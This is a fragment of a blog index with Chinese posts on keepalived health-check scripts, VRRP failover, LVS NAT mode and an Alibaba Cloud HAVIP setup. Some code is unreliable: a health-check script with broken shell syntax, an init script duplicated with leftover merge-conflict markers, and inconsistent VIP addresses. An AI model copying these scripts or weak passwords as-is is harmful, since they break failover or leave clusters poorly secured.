      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[keepalived之vrrp_script总结]]></title>
    <url>%2F2017%2F08%2F10%2FLVS%2F22.%20keepalived%E4%B9%8Bvrrp_script%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[keepalived之vrrp_script总结&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通常情况下，利用keepalived做热备，其中一台设置为master，一台设置为backup。当master出现异常后，backup自动切换为master。当backup成为master后，master恢复正常后会再次抢占成为master，导致不必要的主备切换。因此可以将两台keepalived初始状态均配置为backup，设置不同的优先级，优先级高的设置nopreempt解决异常恢复后再次抢占的问题。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然而keepalived只能做到对网络故障和keepalived本身的监控，即当出现网络故障或 者keepalived本身出现问题时，进行切换。但是这些还不够，我们还需要监控 keepalived所在服务器上的其他业务进程，根据业务进程的运行状态决定是否需要进行主备切换。这个时候，我们可以通过编写脚本对业务进程进行检测监控。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如编写个简单脚本查看haproxy进程是否存活 1234567#!/bin/bashcount = `ps aux | grep -v grep | grep haproxy | wc -l`if [ $count &gt; 0 ]; then exit 0else exit 1fi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在keepalived的配置文件中增加相应配置项 123456789101112131415161718vrrp_script checkhaproxy&#123; script "/home/check.sh" interval 3 weight -20&#125;vrrp_instance test&#123; ... track_script &#123; checkhaproxy &#125; ...&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;keepalived会定时执行脚本并对脚本执行的结果进行分析，动态调整vrrp_instance的优先级。 如果脚本执行结果为0，并且weight配置的值大于0，则优先级相应的增加 如果脚本执行结果非0，并且weight配置的值小于0，则优先级相应的减少 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其他情况，维持原本配置的优先级，即配置文件中priority对应的值。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里需要注意的是： 优先级不会不断的提高或者降低 可以编写多个检测脚本并为每个检测脚本设置不同的weight 不管提高优先级还是降低优先级，最终优先级的范围是在[1,254]，不会出现优先级小于等于0或者优先级大于等于255的情况 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样可以做到利用脚本检测业务进程的状态，并动态调整优先级从而实现主备切换。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但是利用该方式会存在一个问题，例如：A,B两台keepalived &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;A的配置大概为： 1234567891011121314151617181920212223vrrp_script checkhaproxy&#123; script "/etc/check.sh" interval 3 weight -20&#125;vrrp_instance test&#123; .... state backup priority 80 nopreempt track_script &#123; checkhaproxy &#125; ....&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;B的配置大概为： 123456789101112131415161718192021vrrp_script checkhaproxy&#123; script "/etc/check.sh" interval 3 weight -20&#125;vrrp_instance test&#123; .... state backup priority 70 track_script &#123; checkhaproxy &#125; ....&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;A,B同时启动后，由于A的优先级较高，因此通过选举会成为master。当A上的业务进程出现问题时，优先级会降低到60。此时B收到优先级比自己低的vrrp广播包时，将切换为master状态。那么当B上的业务出现问题时，优先级降低到50，尽管A的优先级比B的要 高，但是由于设置了nopreempt，A不会再抢占成为master状态。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以，可以在检测脚本中增加杀掉keepalived进程（或者停用keepalived服务）的方式，做到业务进程出现问题时完成主备切换。]]></content>
      <tags>
        <tag>LVS</tag>
        <tag>keepalived</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Keepalived配置及典型应用案例]]></title>
    <url>%2F2017%2F08%2F10%2FLVS%2F21.%20Keepalived%E9%85%8D%E7%BD%AE%E5%8F%8A%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E6%A1%88%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[Keepalived配置及典型应用案例&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用源码先安装keepalived 1.2.6 1234567cd /usr/local/srcwget http://www.keepalived.org/software/keepalived-1.2.6.tar.gztar zxf keepalived-1.2.6.tar.gz cd keepalived-1.2.6./configure --prefix=/usr/local/keepalived makemake install &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所设keepalived安装到/usr/local/keepalived, 则所有配置文件均位于此目录之下。 我一直没搞明白一个问题，Linux默认总是将程序安装到/usr/local目录下，所有程序共享了/usr/local/sbin目录。这对一些人的操作习惯是有影响的。为何不考虑使用每个软件一个独立的目录呢？ 建立服务启动脚本，以便使用service命令控制之 12cp /usr/local/keepalived/etc/rc.d/init.d/keepalived /etc/init.d/keepalivedchmod +x /etc/init.d/keepalived &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为我们使用非默认路径（/usr/local）安装keepalived, 故需要修改几处路径，以保证keepalived能正常启动, 需要修改的文件如下： 修改/etc/init.d/keepalived, 寻找大约15行左右的. /etc/sysconfig/keepalived, 修改为： . /usr/local/keepalived/etc/sysconfig/keepalived, 即指向正确的文件位置 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;同时在上述行下添加以下内容（将keepavlied主程序所在路径导入到环境变量PATH中）： 12PATH="$PATH:/usr/local/keepalived/sbin"export PATH 修改/usr/local/keepalived/etc/sysconfig/keepalived文件，设置正确的服务启动参数 1KEEPALIVED_OPTIONS="-D -f /usr/local/keepalived/etc/keepalived/keepalived.conf" 经过以上修改，keepalived基本安装即可完成，启动测试之： 1service keepalived restart 切勿忘记将此服务设置为开机启动 1chkconfig keepalived on &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认的配置文件中，指定了两个数个虚拟IP : 192.168.200.16 192.168.200.17 192.168.200.18 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可使用ip addr命令验证之。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上实验只需要一台主机，因为当前节点被指定为主节点，且没有收到其它节点的VRRP组播信息，故自动绑定了虚拟IP。 参考案例一：主-备模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在这种模式下，虚拟IP在某时刻只能属于某一个节点，另一个节点作为备用节点存在。当主节点不可用时，备用节点接管虚拟IP，提供正常服务。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;节点A 192.168.0.11 (主节点), 节点B 192.168.0.12(备用节点) 虚拟IP(对外提供服务的IP 192.168.0.200 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要求默认情况下由节点A提供服务，当节点A不可用时，由节点B提供服务(即虚拟IP漂移至节点B)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;节点A上的配置文件/usr/local/keepalived/etc/keepalived/keepalived.conf 123456789global_defs &#123; notification_email &#123; root@localhost &#125; notification_email_from root@local host smtp_server localhost smtp_connect_timeout 30 router_id NodeA&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认的配置文件中，使用第三方smtp服务器，但这在现实中几乎没有意义（需要验证的原因），我们将其指定为localhost, 将通知信息的发送交给本地sendmail服务处理。查阅说明文档得知route_id配置是为了标识当前节点，我将其设置为NodeA。当然两个节点的此项设置可相同，也可不相同。 12345678910111213141516vrrp_instance VI_1 &#123; state MASTER #指定A节点为主节点 备用节点上设置为BACKUP即可 interface eth0 #绑定虚拟IP的网络接口 virtual_router_id 51 #VRRP组名，两个节点的设置必须一样，以指明各个节点属于同一VRRP组 priority 100 #主节点的优先级（1-254之间），备用节点必须比主节点优先级低 advert_int 1 #组播信息发送间隔，两个节点设置必须一样 authentication &#123; #设置验证信息，两个节点必须一致 auth_type PASS auth_pass 1111 &#125; virtual_ipaddress &#123; #指定虚拟IP, 两个节点设置必须一样 192.168.200.16/24 192.168.200.17 /24 192.168.200.18 /24 &#125;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认的配置文件中，竟然没有子网掩码，从而导致使用了默认子网掩码255.255.255.255，如果导致无法从其它机器访问虚拟IP（keepalived虚拟IP无法ping通）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;按同样的方法配置节点B并修改配置文件，可将A节点的配置文件复制到B节点，并修改以下几项： 123router_id NodeBstate BACKUPpriority 99 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其它项不必修改。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;测试及验证：拔掉节点A的网线，就发现虚拟IP已经绑定到节点B上，再恢复A节点的网线，虚拟IP又绑定回节点A之上。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但是这种方式存在恼裂的可能，即两个节点实际都处于正常工作状态，但是无法接收到彼此的组播通知，这时两个节点均强行绑定虚拟IP，导致不可预料的后果。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这时就需要设置仲裁，即每个节点必须判断自身的状态（应用服务状态及自身网络状态），要实现这两点可使用自定义shell脚本实现，通过周期性地检查自身应用服务状态，并不断ping网关（或其它可靠的参考IP）均可。当自身服务异常、或无法ping通网关，则认为自身出现故障，就应该移除掉虚拟IP(停止keepalived服务即可）。主要借助keepalived提供的vrrp_script及track_script实现： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在keepalived的配置文件最前面加入以下代码，定义一个跟踪脚本： 1234vrrp_script check_local &#123; #定义一个名称为check_local的检查脚本 script "/usr/local/keepalived/bin/check_local.sh" #shell脚本的路径 interval 5 #运行间隔&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;再在vrrp_instance配置中加入以下代码使用上面定义的检测脚本： 123track_script &#123;check_local&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们在/usr/local/keepalived/bin/check_local.sh定义的检测规则是： 自身web服务故障（超时，http返回状态不是200） 无法ping通网关 产生以上任何一个问题，均应该移除本机的虚拟IP(停止keepalived实例即可) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但这里有个小问题，如果本机或是网关偶尔出现一次故障，那么我们不能认为是服务故障。更好的做法是如果连续N次检测本机服务不正常或连接N次无法ping通网关，才认为是故障产生，才需要进行故障转移。另一方面，如果脚本检测到故障产生，并停止掉了keepalived服务，那么当故障恢复后，keepalived是无法自动恢复的。我觉得利用独立的脚本以秒级的间隔检查自身服务及网关连接性，再根据故障情况控制keepalived的运行或是停止。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里提供一个思路，具体脚本内容请大家根据自己的需要编写即可。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如下图的案例： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;假设节点A和B组成主备关系，A为备用节点，B为主节点，那么当在图标红叉位置发生网络故障时，节点A接收不到节点B的组播通知，将抢占虚拟IP。这时出现的后果就是节点Ａ和节点B均拥有虚拟IP，就可能导致了脑裂。所以我们以网关IP连通性作为参考，可避免此问题产生。]]></content>
      <tags>
        <tag>LVS</tag>
        <tag>keepalived</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LVS 的 nat 模式]]></title>
    <url>%2F2017%2F08%2F10%2FLVS%2F2.%20LVS%20%E7%9A%84%20nat%20%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[LVS 的 nat 模式 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;类似于iptables的DNAT，但支持多目标转发。客户端和realserver不能再同一个网段，不然直接响应，不走网关 1.模块讲解&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;客户端发起请求 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nat模式中，vip机器进行ip的转发，只改变目的ip &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;res1和res2需要提供web服务(nginx或者httpd都可以) 2.请求流程图 客户端发起请求到vip机器上，vip服务器根据lvs的算法，转发给realserver服务器（改变目的ip为res1或者res2），并记录连接信息，只改变目的ip，源ip不变。 real-server收到request请求包之后，发现目的ip是自己的ip，处理请求，然后走网关，经过vip vip收到reply包后，修改reply包的源ip地址为vip，发给客户端 从客户端来的属于本地连接的包，查hash表，然后转发给real-server 当client发送完毕以后，此次连接结束或者连接超时，lvs自动从hast表中删除此条记录； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数据包流程如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1.客户端发起请求： 1source 192.168.147.1 dest 192.168.147.150:80 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在vip服务器上，eth1网卡上抓包如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2.lvs(vip)处理请求： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vip服务器上抓包，在eth1网卡： 1source 192.168.147.1:59334 dst 192.168.1.112/111:80 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;3.realserver处理完请求以后，网关是eth0；在vip的eth0上抓包如下 1source 192.168.1.112 dst 192.168.147.1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;4.包经过eth0返回vip服务器，然后经过eth1返回给客户端，源ip改成vip，目的ip不变， 1source 192.168.147.150 dst 192.168.147.1 lvs_nat模式部署过程： （确保所有服务器的iptables selinux都是关闭状态） 两个realserver上安装nginx或者http提供web服务 vip上安装ipvsadm 在vip服务器上新建lvs_nat.sh脚本，然后执行 12345678910111213141516171819#! /bin/bash# director 服务器上开启路由转发功能: echo 1 &gt; /proc/sys/net/ipv4/ip_forward # 关闭icmp的重定向echo 0 &gt; /proc/sys/net/ipv4/conf/all/send_redirectsecho 0 &gt; /proc/sys/net/ipv4/conf/default/send_redirectsecho 0 &gt; /proc/sys/net/ipv4/conf/eth0/send_redirectsecho 0 &gt; /proc/sys/net/ipv4/conf/eth1/send_redirectsiptables -Fiptables -t nat -Fiptables -t nat -X#iptables -t nat -A POSTROUTING -s 192.168.1.0/24 -j MASQUERADEipvsadm -Cipvsadm -A -t 192.168.147.150:80 -s rr -p 300#-p 300 长链接300秒ipvsadm -a -t 192.168.147.150:80 -r 192.168.1.111:80 -m -w 1ipvsadm -a -t 192.168.147.150:80 -r 192.168.1.112:80 -m -w 1 realserver的网关是eth0，及vip的内网ip &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;lvs——nat模式的缺点：当流量比较高时，因为所有的流量进入和出去都要进过lvs，所以瓶颈就在lvs上，而dr模式就比这个效果好很多 待解决问题&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当访问res2的时候，在111上可以抓到112:80到147.1上的包，如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当访问res1时，在111上抓不到112:80到147.1上的包]]></content>
      <tags>
        <tag>LVS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[keepalived 的启动脚本和安装脚本 的结合配置文件详解]]></title>
    <url>%2F2017%2F08%2F10%2FLVS%2F5.%20keepalived%20%E7%9A%84%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC%E5%92%8C%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[keepalived 的启动脚本和安装脚本keepalived 的启动脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161#!/bin/sh## Startup script for the Keepalived daemon## processname: keepalived# pidfile: /var/run/keepalived.pid# config: /etc/keepalived/keepalived.conf# chkconfig: - 21 79# description: Start and stop Keepalived. /etc/init.d/functions# Source configuration file (we set KEEPALIVED_OPTIONS there)#. /etc/sysconfig/keepalivedKEEP_CONF="/export/servers/keepalived-1.2.13/conf/keepalived.conf"KEEP_SBIN="/export/servers/keepalived-1.2.13/sbin/keepalived"KEEP_PID="/var/run/keepalived.pid "RETVAL=0prog="keepalived"start() &#123; echo -n $"Starting $prog: " daemon $KEEP_SBIN --use-file=$KEEP_CONF RETVAL=$? echo return $RETVAL&#125;stop() &#123; echo -n $"Stopping $prog: " killproc -p $KEEP_PID $KEEP_SBIN -TERM RETVAL=$? echo #[ $RETVAL -eq 0 ] &amp;&amp; rm -f /var/lock/subsys/$prog return $RETVAL&#125;reload() &#123; echo -n $"Reloading $prog: " #killproc keepalived -1 killproc -p $KEEP_PID $KEEP_SBIN -HUP RETVAL=$? echo return $RETVAL&#125;# See how we were called.case "$1" in start) start ;; stop) stop ;; reload) reload ;; restart) stop start ;; condrestart) if [ -f /var/lock/subsys/$prog ]; then stop start fi ;; status) status keepalived RETVAL=$? ;; *) echo "Usage: $0 &#123;start|stop|reload|restart|condrestart|status&#125;" RETVAL=1esacexit $RETVAL=======#!/bin/sh## Startup script for the Keepalived daemon## processname: keepalived# pidfile: /var/run/keepalived.pid# config: /etc/keepalived/keepalived.conf# chkconfig: - 21 79# description: Start and stop Keepalived# Source function library. /etc/init.d/functions# Source configuration file (we set KEEPALIVED_OPTIONS there)#. /etc/sysconfig/keepalivedKEEP_CONF="/export/servers/keepalived-1.2.13/conf/keepalived.conf"KEEP_SBIN="/export/servers/keepalived-1.2.13/sbin/keepalived"KEEP_PID="/var/run/keepalived.pid "RETVAL=0prog="keepalived"start() &#123; echo -n $"Starting $prog: " daemon $KEEP_SBIN --use-file=$KEEP_CONF RETVAL=$? echo return $RETVAL&#125;stop() &#123; echo -n $"Stopping $prog: " killproc -p $KEEP_PID $KEEP_SBIN -TERM RETVAL=$? echo #[ $RETVAL -eq 0 ] &amp;&amp; rm -f /var/lock/subsys/$prog return $RETVAL&#125;reload() &#123; echo -n $"Reloading $prog: " #killproc keepalived -1 killproc -p $KEEP_PID $KEEP_SBIN -HUP RETVAL=$? echo return $RETVAL&#125;# See how we were called.case "$1" in start) start ;; stop) stop ;; reload) reload ;; restart) stop start ;; condrestart) if [ -f /var/lock/subsys/$prog ]; then stop start fi ;; status) status keepalived RETVAL=$? ;; *) echo "Usage: $0 &#123;start|stop|reload|restart|condrestart|status&#125;" RETVAL=1esacexit $RETVAL&gt;&gt;&gt;&gt;&gt;&gt;&gt; .r3360 keepalived 的安装脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150#!/bin/bashrole=$1weight=$2vip=$3#routerid=`ifconfig |grep Bcast|cut -d: -f2|awk '&#123;print $1&#125;'|awk -F. '&#123;print $4&#125;'`routerid=$4interface=`ifconfig | awk -F" " '&#123;print $1&#125;' | grep -v lo | grep -v ^\s*$`#vrrd_id=`ifconfig |grep "inet addr"|grep -v "127.0.0.1"|awk -F: '&#123;print $2&#125;'|awk '&#123;print $1&#125;'|awk -F. '&#123;print $4&#125;'`keep_dir=/export/servers/keepalived-1.2.13conf_dir=$keep_dir/confpid_dir=$keep_dir/pidsh_dir=/export/shWHO=`whoami`function help()&#123; echo -e "Install Tips:#Such as master安装 sh $0 MASTER 100 vip routerid # BACKUP安装 sh $0 BACKUP [LESS THEN 100] vip routerid"&#125;if [ $# -eq 0 ]then help exit 1fi########检查网络，安装popt包echo -e "\033[;37;32mCheckNetwork\033[0m"if ! ping -c 1 -w 1 172.22.197.62 &gt; /dev/null; then echo -e "\033[;37;31mPlease Check Network Before Setup\033[0m"; exit 1;else echo -e "\033[;37;32mOK\033[0m";fiecho -e "\033[;37;32mStarting Yum\033[0m"yum -y install popt-devel openssl openssl-devel make openssl-devel popt popt-devel libnl-devel kernel-develecho -e "\033[;37;32mYum Install Done\033[0m"####download and install keepalived-1.2.13.tar.gzcd /usr/local/src/keepalivedif [ ! -e keepalived-1.2.13.tar.gz ]then wget http://172.22.197.62/CentOS/app/keepalived-1.2.13.tar.gz tar xzf keepalived-1.2.13.tar.gzelse tar xzf keepalived-1.2.13.tar.gzfirpm -ivh popt-static-1.13-7.el6.x86_64.rpmcd keepalived-1.2.13./configure --prefix=/export/servers/keepalived-1.2.13 --sysconfdir=/export/servers/keepalived-1.2.13/etc/ --bindir=/export/servers/keepalived-1.2.13/bin/ --with-kernel-dir=/usr/src/linux/make &amp;&amp; make installif [ $? -eq 0 ] then echo "make success" else echo "make error" exit 1ficp /export/servers/keepalived-1.2.13/sbin/keepalived /usr/sbin/cp /export/servers/keepalived-1.2.13/etc/sysconfig/keepalived /etc/sysconfig/cp ../keepalived /etc/init.d/chmod +x /etc/init.d/keepalivedchkconfig --add keepalivedchkconfig keepalived onecho -e "\033[;37;32m创建keepalive配置文件路径\033[0m"mkdir -p $conf_dir#######添加keepalive配置文件cat &gt; $conf_dir/keepalived.conf &lt;&lt;EOF! Configuration File for keepalivedglobal_defs &#123; notification_email &#123; lihuiyw@jd.com &#125; notification_email_from lihuiyw@jd.com smtp_server mail.jd.com smtp_connect_timeout 30 router_id LVS_DEVEL&#125;vrrp_script check_alive&#123; script "/export/sh/check_nginx_alive.sh" # check every 2 seconds interval 2 # if failed, decrease 10 of the priority weight -10 # require 2 failures for failures fail 2 # require 1 sucesses for ok rise 1&#125;vrrp_instance VIP_$&#123;routerid&#125;&#123; state $role interface $interface virtual_router_id $routerid priority $weight advert_int 2 garp_master_delay 10 smtp_alert authentication &#123; auth_type PASS auth_pass 123456 &#125; virtual_ipaddress &#123; $&#123;vip&#125;/24 &#125; track_interface &#123; $interface &#125; track_script &#123; check_alive &#125;&#125;EOF###########监控keepalived脚本、脚本需要放到同keepalived配置文件指定路径echo -e "\033[;37;32m创建脚本路径\033[0m"mkdir -p $sh_dir $pid_dircat &gt; $sh_dir/check_nginx_alive.sh &lt;&lt; EOF#!/bin/bash#监控脚本功能概述：#首先检查进程中的nginx进程数目，如果不存在（即为0）,则表示nginx未开启，然后开启nginx。#3秒后重新检查nginx进程数，若仍为0，则表示nginx无法正常启动，此时强制停止keepalived进程，让虚拟ip切换到backup服务器上## 如果没有nginx进程，即值为零#echo \`pgrep -l nginx\`#echo \`ps -ef | grep nginx\`if [ \`pgrep "^nginx" | wc -l\` -eq 0 ]then service nginx start sleep 1 if [ \`pgrep "^nginx" | wc -l\` -eq 0 ] then ## 则结束 keepalived 进程，使得服务器切换到BACKUP服务器上 service keepalived stop fifiEOFecho -e "\033[;37;32m赋可执行权限\033[0m"chown -R admin.admin $conf_dir $keep_dir $sh_dir#chmod 777 $sh_dir/check_nginx_alive.sh/export/servers/keepalived-1.2.13/sbin/keepalived --use-file=/export/servers/keepalived-1.2.13/conf/keepalived.conf&gt;/home/install_keepalived.logif [ $? -eq 0 ] then echo "keepalived install done"fi]]></content>
      <tags>
        <tag>LVS</tag>
        <tag>keepalived</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[阿里云下配置keepalive，利用HAVIP实现HA]]></title>
    <url>%2F2017%2F08%2F10%2FLVS%2F23.%20%E9%98%BF%E9%87%8C%E4%BA%91%E4%B8%8B%E9%85%8D%E7%BD%AEkeepalive%EF%BC%8C%E5%88%A9%E7%94%A8HAVIP%E5%AE%9E%E7%8E%B0HA%2F</url>
    <content type="text"><![CDATA[阿里云下配置keepalive，利用HAVIP实现HA&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;摘要： 包括阿里云在内的很多云环境，因为不支持浮动IP广受诟病。目前阿里云在VPC网络下发布了HAVIP，能够实现arp宣告IP。这样也就让自己搭建HA成为了可能，有幸拿到了内测权限体验了一下。(classical网络依然不支持) 测试环境： 1 2 3 4 5 6 VPC：192. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;包括阿里云在内的很多云环境，因为不支持浮动IP广受诟病。目前阿里云在VPC网络下发布了HAVIP，能够实现arp宣告IP。这样也就让自己搭建HA成为了可能，有幸拿到了内测权限体验了一下。(classical网络依然不支持)测试环境： 123456 VPC：192.168.1.0/24 ECS: nginx1：192.168.1.1 nginx2:192.168.1.2 HAVIP:192.168.1.3 绑定到havip的公网EIP：121.43.187.37 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置完毕后的拓扑如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;环境搭建完毕后，登陆主备ECS服务器，分别配置nginx+keepalived 1[root@Nginx1 ~]# yum install nginx keepalived -y &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MASTER服务器（nginx1）配置文件/etc/keepalived/keepalived.conf内容以及解释如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647! Configuration File for keepalived #配置global_defs，主要用于标示机器，以及故障时通知 global_defs &#123; router_id Nginx1 &#125; #配置vrrp_script，主要用于健康检查，以及检查失败后执行的动作。 vrrp_script chk_nginx &#123; #健康检查脚本，当脚本返回值不为0时认为失败 script "/etc/keepalived/ck_ng.sh" #检查频率，以下配置每2秒检查1次 interval 2 #当检查失败后，将vrrp_instance的priority减小5 weight -5 #连续监测失败3次，才认为真的健康检查失败。并调整优先级 fall 3 #连续监测2次成功，就认为成功。但不调整优先级 rise 2 &#125; #定义对外提供服务的VIP vrrp_instance配置 vrrp_instance VI_1 &#123; #指定vrrp_instance的初始状态，是MASTER还是BackUP主要还是看优先级。 state MASTER #指定vrrp_instance绑定的网卡，最终会通过指定的网卡宣告VIP interface eth0 #发送心跳包的源IP，可使用绑定的网卡IP，也可以使用本服务器上的其他IP mcast_src_ip 192.168.1.1 #相当于VRID，用于在一个网内区分组播，需要组播域内内唯一。 virtual_router_id 55 #本机的优先级，VRID相同的机器中，优先级最高的会被选举为MASTER priority 101 #心跳间隔，下面配置，MASTER会每隔1秒发送一个报文高职组内其他机器，自己还活着。 advert_int 1 #定义主从的验证方式以及密码，一般使用PASS(最长8位，超过了只会识别前8位作为密码) authentication &#123; auth_type PASS auth_pass aliyun &#125; #VIP,在阿里云下就是刚才创建的HAVIP virtual_ipaddress &#123; 192.168.1.4 &#125; #本vrrp_instance所引用的脚本配置，名称就是vrrp_script 定义的容器名 track_script &#123; chk_nginx &#125; &#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;BACKUP服务器（nginx2）的配置需要修改： 123state MASTER改为 state BACKUP mcast_src_ip 192.168.1.1改为backup服务器实际的IP mcast_src_ip 192.168.1.2 priority 101改小一些，比如 priority 100 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其它保持一致即可 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为了实现nginx服务异常的时候能够自动切换，需要自己写一个脚本，脚本没有硬性的要求，能够实现目标即可，这里 监控nginx进程数为例： 12345678910111213141516vim /etc/keepalived/ck_ng.sh #!/bin/bash #检查nginx进程是否存在 count=$(ps -C nginx --no-heading|wc -l) #进程数等于0的时候 if [ "$&#123;count&#125;" = "0" ]; then #尝试启动一次nginx，停止2秒后再次检测 service nginx start sleep 2 count=$(ps -C nginx --no-heading|wc -l) if [ "$&#123;count&#125;" = "0" ]; then #如果启动没成功，就杀掉keepalive触发主备切换 /etc/init.d/keepalived stop fi fi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;增加脚本的执行权限 1chmod +x vim /etc/keepalived/ck_ng.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;分别启动nginx1和nginx2的nginx&amp;keepalived服务： 123[root@Nginx1 ~]# /etc/init.d/nginx start;/etc/init.d/keepalived start Starting nginx: [ OK ] Starting keepalived: [ OK ] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;测试： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;NGINX1/192.168.1.1的priority 为101，NGINX2/192.168.1.2的priority为100，这时候访问HAVIP绑定的EIP：http://121.43.187.37/可以看到访问到了服务器NGINX1,如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;到HAVIP控制台查看，192.168.1.1的服务器为主服务器 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这时候我们KILL掉nginx1服务器的nginx服务 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看日志，发送了移除VIP的报文： 123Oct 23 17:20:01 iZ239aqzdi7Z Keepalived_vrrp[25019]: VRRP_Instance(VI_1) sending 0 priority Oct 23 17:20:01 iZ239aqzdi7Z Keepalived_vrrp[25019]: VRRP_Instance(VI_1) removing protocol VIPs. Oct 23 17:20:01 iZ239aqzdi7Z Keepalived_healthcheckers[25018]: Netlink reflector reports IP 192.168.1.3 removed &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这时候访问http://121.43.187.37/，可以看到访问自动切换到了NGINX2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;到HAVIP控制台查看，192.168.1.2的服务器为主服务器 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重新启动nginx1的nginx和keepalive服务 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看日志可以看到keepalive重新发送了IP宣告的报文 12345Oct 23 17:22:14 iZ239aqzdi7Z Keepalived_vrrp[25610]: VRRP_Instance(VI_1) Entering MASTER STATE Oct 23 17:22:14 iZ239aqzdi7Z Keepalived_vrrp[25610]: VRRP_Instance(VI_1) setting protocol VIPs. Oct 23 17:22:14 iZ239aqzdi7Z Keepalived_vrrp[25610]: VRRP_Instance(VI_1) Sending gratuitous ARPs on eth0 for 192.168.1.3 Oct 23 17:22:14 iZ239aqzdi7Z Keepalived_healthcheckers[25609]: Netlink reflector reports IP 192.168.1.3 added Oct 23 17:22:19 iZ239aqzdi7Z Keepalived_vrrp[25610]: VRRP_Instance(VI_1) Sending gratuitous ARPs on eth0 for 192.168.1.3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重新访问http://121.43.187.37/测试，重新访问到了服务器NGINX1，到HAVIP控制台查看，192.168.1.1的服务器重新夺回了控制权，成为了为主服务器 